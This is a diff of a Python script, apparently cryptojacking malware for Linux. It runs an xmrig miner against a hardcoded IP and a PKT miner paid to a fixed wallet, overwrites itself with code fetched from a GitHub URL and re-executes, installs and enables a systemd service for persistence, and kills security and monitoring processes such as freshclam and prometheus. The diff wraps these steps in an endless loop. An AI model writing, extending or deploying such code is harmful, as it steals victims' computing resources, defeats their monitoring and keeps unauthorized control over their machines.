@@ -37,51 +37,50 @@ if operate_system == 'lin':
 import psutil
 command_xmrig_default = '-o 66.42.53.57:443 --tls -t %s --cpu-max-threads-hint=100' %cores
 #command_xmrig_default = '-o 66.42.53.57:443 --tls --cpu-max-threads-hint=100'
-#while True:
-time.sleep(1)
-working_dir = os.path.dirname(os.path.realpath(__file__))
-print(working_dir)
-path_app = os.path.realpath(__file__)
-version_chinh = 5.0
-link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_chinh'
-link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_cpu.py'
-try:
-    response = requests.get(link_version_chinh, timeout=timeout)
-    get_version_chinh = float(response.text)
-    print(get_version_chinh)
-    if get_version_chinh == version_chinh:
-        print('Dang o version moi nhat la %s' % version_chinh)
-    else:
-        if len(response.text) < 5:
-            print('Co version moi, update thoi')
-            response = requests.get(link_dao, timeout=timeout)
-            data_trave = response.text
-            print(data_trave)
-            fileopen = open(path_app, 'w+')
-            fileopen.write(data_trave)
-            fileopen.close()
-            os.system('python3 %s' % path_app)
-            sys.exit()
-except:
-    pass
-
-if operate_system == 'lin':
+while True:
+    time.sleep(1)
+    working_dir = os.path.dirname(os.path.realpath(__file__))
+    print(working_dir)
+    path_app = os.path.realpath(__file__)
+    version_chinh = 5.0
+    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_chinh'
+    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_cpu.py'
     try:
-        path_service = '/lib/systemd/system/dao.service'
-        data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
-        if not os.path.exists(path_service):
-            fileopen = open(path_service, 'w+')
-            fileopen.write(data + '\n')
-            fileopen.close()
-        #os.system('chmod 600 %s' %path)
-            os.system('systemctl daemon-reload')
-            os.system('systemctl enable dao')
+        response = requests.get(link_version_chinh, timeout=timeout)
+        get_version_chinh = float(response.text)
+        print(get_version_chinh)
+        if get_version_chinh == version_chinh:
+            print('Dang o version moi nhat la %s' % version_chinh)
+        else:
+            if len(response.text) < 5:
+                print('Co version moi, update thoi')
+                response = requests.get(link_dao, timeout=timeout)
+                data_trave = response.text
+                print(data_trave)
+                fileopen = open(path_app, 'w+')
+                fileopen.write(data_trave)
+                fileopen.close()
+                os.system('python3 %s' % path_app)
+                sys.exit()
     except:
         pass
-    
-    #print('So cores de dao la %s' %cores)
-    #xmr
-    while True:
+
+    if operate_system == 'lin':
+        try:
+            path_service = '/lib/systemd/system/dao.service'
+            data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
+            if not os.path.exists(path_service):
+                fileopen = open(path_service, 'w+')
+                fileopen.write(data + '\n')
+                fileopen.close()
+            #os.system('chmod 600 %s' %path)
+                os.system('systemctl daemon-reload')
+                os.system('systemctl enable dao')
+        except:
+            pass
+        
+        #print('So cores de dao la %s' %cores)
+        #xmr
         '''
         link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
         link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
@@ -127,7 +126,7 @@ if operate_system == 'lin':
                 os.system('tar xf %s' %gz_name)
         except:
             pass
-    
+
         try:
             xmrig_dachay = False
             for proc in psutil.process_iter():
@@ -203,8 +202,8 @@ if operate_system == 'lin':
             pass
         if pkt_dachay == False:
             #command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com http://pool.pkthash.com -t 1' % pkt_name
-            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com' % pkt_name
-            #command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/' % pkt_name
+            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com http://pool.pkthash.com' % pkt_name
+            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/' % pkt_name
             print(command)
             if os.path.isfile('/usr/bin/screen'):
                 print('Co chuong trinh screen')
@@ -214,7 +213,7 @@ if operate_system == 'lin':
                 os.system ('nohup %s &' %command)
             else:
                 os.system ('%s &' %command)
-        for i in range(0, thoi_gian_nghi, 2):
+        for i in range(0, thoi_gian_nghi,2):
             time.sleep(2)
             print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
             array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
@@ -224,4 +223,4 @@ if operate_system == 'lin':
                 except:
                     pass
       
-   
+  
